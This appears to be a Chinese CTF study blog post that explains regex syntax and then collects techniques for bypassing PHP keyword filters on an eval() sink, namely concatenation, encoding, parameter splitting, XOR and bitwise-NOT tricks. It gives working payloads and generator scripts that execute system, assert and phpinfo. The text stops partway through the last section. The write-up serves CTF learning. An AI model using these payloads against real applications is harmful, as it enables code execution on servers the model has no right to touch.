<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/g:表示该表达式将用来在输入字符串中查找所有可能的匹配，返回的结果可以是多个,如果不加/g最多只会匹配一个</span><br><span class="line">/i:表示匹配的时候不区分大小写</span><br><span class="line">/m:表示多行匹配(匹配换行符两端的潜在匹配),影响正则中的^$符号</span><br><span class="line">/s:与/m相对,单行模式匹配</span><br><span class="line">/e:可执行模式(可导致PHP代码执行),此为PHP专有参数，例如preg_replace函数</span><br><span class="line">/x:忽略空白模式</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>符号</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>.</td>
<td>匹配除换行符的所有字符</td>
</tr>
<tr>
<td>\d</td>
<td>匹配数字</td>
</tr>
<tr>
<td>\D</td>
<td>匹配除去数字的字符</td>
</tr>
<tr>
<td>\w</td>
<td>匹配文字字符，英语或中文都行</td>
</tr>
<tr>
<td>\W</td>
<td>匹配非文字字符</td>
</tr>
<tr>
<td>\s</td>
<td>匹配空白符(包含 Tab 和 换行符)</td>
</tr>
<tr>
<td>\S</td>
<td>匹配非空白符</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td>^</td>
<td>匹配字符串的开始</td>
</tr>
<tr>
<td>$</td>
<td>匹配字符串的结束</td>
</tr>
<tr>
<td>(a | b)</td>
<td>匹配 a 或者 b</td>
</tr>
<tr>
<td>(ab) | (cd)</td>
<td>匹配 ab 或者 cd</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td>?</td>
<td>最多匹配前面的字符一次（0或1）</td>
</tr>
<tr>
<td>*</td>
<td>至少匹配前面的字符零次（&gt;&#x3D;0）</td>
</tr>
<tr>
<td>+</td>
<td>至少匹配前面的字符一次（&gt;&#x3D;1）</td>
</tr>
<tr>
<td>{n}</td>
<td>匹配前面的字符 n 次，换言之：匹配前面 n 个字符</td>
</tr>
<tr>
<td>{n,}</td>
<td>匹配前面的字符最少 n 次</td>
</tr>
<tr>
<td>{n,m}</td>
<td>匹配前面的字符最少 n 次，最多 m 次</td>
</tr>
</tbody></table>
<p>​	方括号  [ ]  表示要匹配的几种类型的字符，如：[abc]  可以匹配 a、b、c 任意一字符，等价于 [a-c]；[123] 可以匹配 1、2、3 任意一字符。在 [] 中的<code>.</code>失去原来的意义(匹配除换行符以外的所有字符)，无需转义。若在 [ ] 中有 <code>^</code>，则为 非 的意思，在其他地方表示 字符串的开始</p>
<ul>
<li>贪婪模式：在整个表达式匹配成功的前提下，尽可能<strong>多</strong>地 匹配字符</li>
<li>非贪婪模式：同上的前提下，尽可能<strong>少</strong>地 匹配字符，可在表示数量的标识符后输入 <code>?</code> 来开启非贪婪模式，如<code>*?</code>、<code>+? </code>、<code>??</code></li>
</ul>
<h1 id="正则表达式绕过"><a href="#正则表达式绕过" class="headerlink" title="正则表达式绕过"></a>正则表达式绕过</h1><p>​	做CTF时遇到了使用正则表达式 过滤了所有的英文字母和数字 或者 过滤一些关键字等等，以下是收集的一些绕过方法</p>
<h2 id="字符串拼接绕过"><a href="#字符串拼接绕过" class="headerlink" title="字符串拼接绕过"></a>字符串拼接绕过</h2><blockquote>
<p>适用版本：PHP&gt;&#x3D;7，适用于绕过 过滤具体关键字</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/phpinfo|system/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;No Hack!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$cmd</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	类似像这样过滤了关键字，虽然可以用passthru()等函数代替，但只要加上黑名单就无从下手</p>
<p>网上的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(p.hpinfo)();</span><br><span class="line">(p.h.(pi).n.f.o)();</span><br><span class="line">(p.h.p.i.n.f.o)();</span><br><span class="line"></span><br><span class="line">(sy.(st).em)(whoami);</span><br><span class="line">(sy.(st).em)(who.ami);</span><br><span class="line">(s.y.s.t.e.m)(&quot;whoami&quot;);</span><br></pre></td></tr></table></figure>

<h2 id="字符串编码绕过"><a href="#字符串编码绕过" class="headerlink" title="字符串编码绕过"></a>字符串编码绕过</h2><blockquote>
<p>适用PHP版本：PHP&gt;&#x3D;7</p>
</blockquote>
<p>​	同上面的情况，过滤了关键字后，我们还可以使用 该字符串的八进制、十六进制、unicode等编码方式绕过</p>
<p>网上的处理脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hex_payload</span>(<span class="params">payload</span>):</span><br><span class="line">	res_payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">		i = <span class="string">&quot;\\x&quot;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line">		res_payload += i</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;&#x27;&#123;&#125;&#x27; Convert to hex: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oct_payload</span>(<span class="params">payload</span>):</span><br><span class="line">	res_payload = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">		i = <span class="string">&quot;\\&quot;</span> + <span class="built_in">oct</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line">		res_payload += i</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;&#x27;&#123;&#125;&#x27; Convert to oct: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uni_payload</span>(<span class="params">payload</span>):</span><br><span class="line">	res_payload = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">		i = <span class="string">&quot;\\u&#123;&#123;&#123;0&#125;&#125;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:])</span><br><span class="line">		res_payload += i</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;&#x27;&#123;&#125;&#x27; Convert to unicode: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	payload = <span class="string">&#x27;phpinfo&#x27;</span></span><br><span class="line">	hex_payload(payload)</span><br><span class="line">	oct_payload(payload)</span><br><span class="line">	uni_payload(payload)</span><br></pre></td></tr></table></figure>

<p>​	编码后的字符串必须双引号包裹在进行传参</p>
<p>payload：（只是将 被过滤的关键字 编码了，如果把 整个命令 进行编码在本地运行不了）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x70\x68\x70\x69\x6e\x66\x6f&quot;();					//phpinfo();</span><br><span class="line">&quot;\x73\x79\x73\x74\x65\x6d&quot;(dir);					//system(&#x27;dir&#x27;);</span><br><span class="line">&quot;\163\171\163\164\145\155&quot;(&#x27;dir&#x27;);					//system(&#x27;dir&#x27;);</span><br><span class="line">&quot;\u&#123;73&#125;\u&#123;79&#125;\u&#123;73&#125;\u&#123;74&#125;\u&#123;65&#125;\u&#123;6d&#125;&quot;(&#x27;dir&#x27;);		//system(&#x27;dir&#x27;);</span><br></pre></td></tr></table></figure>

<p>​	至于可以运行的理由嘛……嗯，我也不太懂。这些字符串被编码了所以绕过了正则表达式，貌似这些被编码的字符串仍能作为原来的命令被执行，只有 <code>( )</code> 这两个字符被编码后就好像无法识别一样，在本地测试下运行不了，但也只有这两个字符(应该是，没试过其他奇怪的字符)</p>
<p>​	下面这个 <code>&quot;\x77\x68\x6f\x61\x6d\x69&quot;</code> 是 whoami 的十六进制，其他的是 system 的十六进制编码，可以看到将命令编码后仍能执行(但 <code>( )</code>不行，所以不能将带 <strong>括号</strong> 的命令整个进行编码)</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/002/002-php-07.jpg" alt="002-php-07"></p>
<h2 id="多次传参绕过"><a href="#多次传参绕过" class="headerlink" title="多次传参绕过"></a>多次传参绕过</h2><blockquote>
<p>适用PHP版本：无限制</p>
</blockquote>
<p>​	如果同时过滤掉了 单(双)引号，可以用下面方式进行绕过</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/002/002-php-08.jpg" alt="002-php-08"></p>
<p>​	用 GET方式 将想要执行的命令当作变量传入，然后再用 POST方式 将命令进行拼接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET方式:	?1=system&amp;2=whoami</span><br><span class="line">POST方式:	cmd=$_GET[1]($_GET[2]);</span><br></pre></td></tr></table></figure>

<p>​	当然也可以将 想要执行命令的字符串 都用 POST方式传入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=$_POST[1]($_POST[2]);&amp;1=system&amp;2=whoami</span><br></pre></td></tr></table></figure>

<h2 id="内置函数访问绕过"><a href="#内置函数访问绕过" class="headerlink" title="内置函数访问绕过"></a>内置函数访问绕过</h2><blockquote>
<p>适用PHP版本：PHP&gt;&#x3D;7(PHP5在本地运行报错)</p>
</blockquote>
<p>**get_defined_functions()**：获取所有已定义函数的数组，可通过 $arr[“internal”] 来访问系统内置函数，通过 $arr[“user”] 来访问用户自定义函数</p>
<p>​	<del>啊，这个太麻烦，需要知道 函数 的位置下标才能完成，可是PHP版本太多，版本不同 函数 的下标也不同，可恶，不会写脚本……正当我这么想的时候。对啊，写个脚本虽然不行，但还是可以写两三行代码凑合凑合的，想要换版本要通过小皮换，再次深刻感受到自己是个废物</del></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$str</span> = <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">get_defined_functions</span>(),<span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[[0-9]+] =&gt; phpinfo/i&#x27;</span>,<span class="variable">$str</span>,<span class="variable">$number</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$number</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>大概就是这个样子，想要搜索其他函数还得自己动手修改，也只能知道个下标，<del>哎,凑合看吧</del></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/002/002-php-09.jpg" alt="002-php-09"></p>
<p>payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd=get_defined_functions()[internal][283]();				php7.0.9,phpinfo();</span><br><span class="line">cmd=get_defined_functions()[internal][356](whoami);			php7.3.4,system(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="异或拼接绕过"><a href="#异或拼接绕过" class="headerlink" title="异或拼接绕过"></a>异或拼接绕过</h2><blockquote>
<p>适用PHP版本：PHP5以及PHP7.0.9版本</p>
</blockquote>
<p>​	在 PHP 中两个字符异或之后，得到的是还是一个字符</p>
<p>异或：对该字符对应ASCII的二进制进行的运算，两相同数字异或得0，不同数字异或得1</p>
<p>生成异或字符串的脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;assert&quot;</span></span><br><span class="line">strlist = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">58</span>, <span class="number">59</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">62</span>, <span class="number">63</span>, <span class="number">64</span>, <span class="number">91</span>, <span class="number">93</span>, <span class="number">94</span>, <span class="number">95</span>, <span class="number">96</span>, <span class="number">123</span>, <span class="number">124</span>, <span class="number">125</span>, <span class="number">126</span>, <span class="number">127</span>]</span><br><span class="line"><span class="comment">#strlist是ascii表中所有非字母数字的字符十进制</span></span><br><span class="line">str1,str2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strlist:</span><br><span class="line">            <span class="keyword">if</span>(i ^ j == <span class="built_in">ord</span>(char)):</span><br><span class="line">                i = <span class="string">&#x27;%&#123;:0&gt;2&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(i)[<span class="number">2</span>:])</span><br><span class="line">                j = <span class="string">&#x27;%&#123;:0&gt;2&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(j)[<span class="number">2</span>:])</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;(&#x27;&#123;0&#125;&#x27;^&#x27;&#123;1&#125;&#x27;)&quot;</span>.<span class="built_in">format</span>(i,j),end=<span class="string">&quot;.&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span>	</span><br></pre></td></tr></table></figure>

<p>一次代码执行只能得到我们想要执行语句的字符串，并不能执行语句，所以需要执行两次代码执行，构造出<code>assert($_GET[_]);</code>（当然 <code>$_POST</code>也可以）</p>
<ul>
<li><p>$_GET</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7c&#x27;</span>);</span><br><span class="line">	<span class="comment">//$_=&#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%07&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%5d&#x27;</span>);</span><br><span class="line">	<span class="comment">//$__=&#x27;_GET&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line">	<span class="comment">//$___=&#x27;$_GET&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br><span class="line">	<span class="comment">//assert($_GET[_]);</span></span><br><span class="line">&amp;_=<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"></span><br><span class="line">最终payload为:</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7c&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%07&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%5d&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);&amp;_=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
</li>
<li><p>$_POST</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7c&#x27;</span>);</span><br><span class="line">	<span class="comment">//$_=&#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0b&#x27;</span>^<span class="string">&#x27;%5b&#x27;</span>).(<span class="string">&#x27;%0f&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%5b&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%5d&#x27;</span>);</span><br><span class="line">	<span class="comment">//$__=&#x27;_POST&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line">	<span class="comment">//$___=&#x27;$_POST&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br><span class="line">	<span class="comment">//assert($_PSOT[_]);</span></span><br><span class="line"></span><br><span class="line">最终payload为(记得用POST方式将命令赋值给 _变量):</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7c&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0b&#x27;</span>^<span class="string">&#x27;%5b&#x27;</span>).(<span class="string">&#x27;%0f&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%5b&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%5d&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure>
</li>
<li><p>接下来照猫画虎构造 system(‘dir’)，用上面得方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%02&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7c&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%0d&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>);</span><br><span class="line">	<span class="comment">//$_=&#x27;system&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%07&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%5d&#x27;</span>);</span><br><span class="line">	<span class="comment">//$__=&#x27;_GET&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line">	<span class="comment">//$___=&#x27;$_GET&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br><span class="line">	<span class="comment">//system($_GET[_]);</span></span><br><span class="line">&amp;_=dir;</span><br><span class="line"></span><br><span class="line">最终payload为:</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%02&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7c&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%0d&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%07&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%5d&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);&amp;_=dir;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>​	在本地测试一下，运行成功(提前先把字符集改成了gbk)</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/002/002-php-06.jpg" alt="002-php-06"></p>
<p>若无法使用，可以先用 phpinfo() 查看 <strong>disable_functions</strong> 是否是否禁用了 system 函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo 	<span class="comment">// 网上的payload</span></span><br></pre></td></tr></table></figure>

<h2 id="URL编码取反绕过"><a href="#URL编码取反绕过" class="headerlink" title="URL编码取反绕过"></a>URL编码取反绕过</h2><p>​	我们将 字符串 URL编码 后取反，我们传入参数后服务端进行url解码，这时由于取反后，会 解码 成不可打印字符，这样我们就会绕过 正则表达式</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);	<span class="comment">//%8F%97%8F%96%91%99%90</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();		&lt;===&gt;<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>

<p>~：按位取反，对二进制取反(0变1，1变0)， 实际的值以补码的形式表示</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();		<span class="comment">//记得加上 (~);</span></span><br></pre></td></tr></table></figure>

<p>当 <strong>5&lt;&#x3D;PHP&lt;&#x3D;7.0.9</strong> 时，需要参考上面那个 异或拼接 的方法</p>
<ul>
<li><p>$_GET</p>
